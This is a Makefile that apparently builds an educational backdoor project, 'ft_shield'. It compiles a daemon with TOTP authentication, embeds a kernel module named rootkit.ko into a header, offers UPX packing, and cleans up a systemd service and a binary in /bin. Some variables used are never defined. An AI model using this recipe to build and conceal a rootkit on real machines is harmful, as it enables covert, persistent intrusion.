# bonus/Makefile

# COLORS
GREEN 	= @echo "\033[0;32m"
RESET 	= "\033[1;0m"

# VARIABLES
NAME 		= ft_shield_bonus
CC 			= gcc
CFLAGS 		= -Wall -Wextra -g -fsanitize=address -MMD -MP -Werror $(INCLUDE)
LDFLAGS		= -fsanitize=address
LDLIBS		= -loath -lutil
INCLUDE 	= -I/usr/include/liboath
# PATHS
SRC_PATH    	= srcs
OBJ_PATH    	= objects

# SOURCES
SRC =	main.c \
		daemon.c \
		socket.c \
		authentication.c

SRCS 	  = $(addprefix $(SRC_PATH)/, $(SRC))
OBJS 	  = $(addprefix $(OBJ_PATH)/, $(SRC:%.c=%.o))

# RULES
# RULES #
#
all: $(NAME)

$(OBJ_PATH):
	mkdir -p $(OBJ_PATH)

$(TOOLS_OBJ_PATH):
	mkdir -p $(TOOLS_OBJ_PATH)

TOOLS_SRC = tools/secret_generator.c
TOOLS_OBJ = $(addprefix $(TOOLS_OBJ_PATH)/, $(notdir $(TOOLS_SRC:.c=.o)))
# Generar la clave secreta aleatoria en Base32

$(TOOLS_OBJ_PATH)/%.o: tools/%.c | $(TOOLS_OBJ_PATH)
	$(CC) $(CFLAGS) -c $< -o $@

tools/generate_secret: $(TOOLS_OBJ)
	$(CC) $(CFLAGS) $(LDFLAGS) $(LDLIBS) $^ -o $@

define get_secret
SECRET := $(shell ./tools/generate_secret)
export SECRET
endef

.PHONY: gen_secret
gen_secret: tools/generate_secret
	$(eval $(get_secret))

$(OBJ_PATH)/%.o: $(SRC_PATH)/%.c gen_secret | $(OBJ_PATH)
	echo $(get_secret)
	$(CC) $(CFLAGS) -DSECRET=\"$(SECRET)\" -c $< -o $@

$(NAME): modules $(OBJS) Makefile
	$(CC) $(OBJS) $(LDFLAGS) $(LDLIBS) -o $(NAME)
	echo $(SECRET)
	qrencode -t ANSI "otpauth://totp/ft_shield:jalvarodro@example.com?secret=$(SECRET)&issuer=ft_shield"
	$(GREEN) Program asembled $(RESET)
	@echo "⠀⠀⠀	    ⣠⣴⣶⣿⣿⣷⣶⣄⣀⣀\n\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀\n\
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡟⠁⣰⣿⣿⣿⡿⠿⠻⠿⣿⣿⣿⣿⣧⠀⠀⠀⠀\n\
⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠏⠀⣴⣿⣿⣿⠉⠀⠀⠀⠀⠀⠈⢻⣿⣿⣇⠀⠀⠀\n\
⠀⠀⠀⠀⢀⣠⣼⣿⣿⡏⠀⢠⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡀⠀⠀\n\
⠀⠀⠀⣰⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀\n\
⠀⠀⢰⣿⣿⡿⣿⣿⣿⡇⠀⠘⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⣿⠁⠀⠀\n\
⠀⠀⣿⣿⣿⠁⣿⣿⣿⡇⠀⠀⠻⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⠃⠀⠀⠀\n\
⠀⢰⣿⣿⡇⠀⣿⣿⣿⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀\n\
⠀⢸⣿⣿⡇⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠉⢉⣿⣿⠀⠀⠀⠀⠀⠀\n\
⠀⢸⣿⣿⣇⠀⣿⣿⣿⠀⠀⠀⠀⠀⢀⣤⣤⣤⡀⠀⠀⢸⣿⣿⣿⣷⣦⠀⠀⠀\n\
⠀⠀⢻⣿⣿⣶⣿⣿⣿⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⡀⠀⠉⠉⠻⣿⣿⡇⠀⠀\n\
⠀⠀⠀⠛⠿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠈⠹⣿⣿⣇⣀⠀⣠⣾⣿⣿⡇⠀⠀\n\
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⣤⣤⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀\n\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠛⠋⠉⠉⠁⠀⠀⠀⠀\n\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁\n"

modules:
	$(MAKE) -C ./srcs/modules/
	xxd -i srcs/modules/rootkit.ko > includes/rootkit.h

$(UPX_EXECUTABLE): 
	wget https://github.com/upx/upx/releases/download/v$(UPX_VERSION)/upx-$(UPX_VERSION)-amd64_linux.tar.xz
	tar -xvf  upx-$(UPX_VERSION)-amd64_linux.tar.xz
	rm -rf upx-$(UPX_VERSION)-amd64_linux.tar.xz

pack: $(UPX_EXECUTABLE) $(NAME)
	./$(UPX_EXECUTABLE) --best $(NAME)

-include $(OBJS:.o=.d)
clean:
	rm -rf $(OBJ_PATH) $(TOOLS_OBJ_PATH)
	$(MAKE) -C ./srcs/modules/ clean

fclean: clean
	rm -rf $(NAME) tools/generate_secret tools/ft_shield_qr.png
	rm -rf /etc/systemd/system/ft_shield.service 
	rm -rf /bin/ft_shield
	rm -rf /home/ubuntu/ft_shield/ft_shield.log
	rm -rf /home/ubuntu/ft_shield/new_ft_shield.log

re: fclean all

.PHONY: all clean fclean re

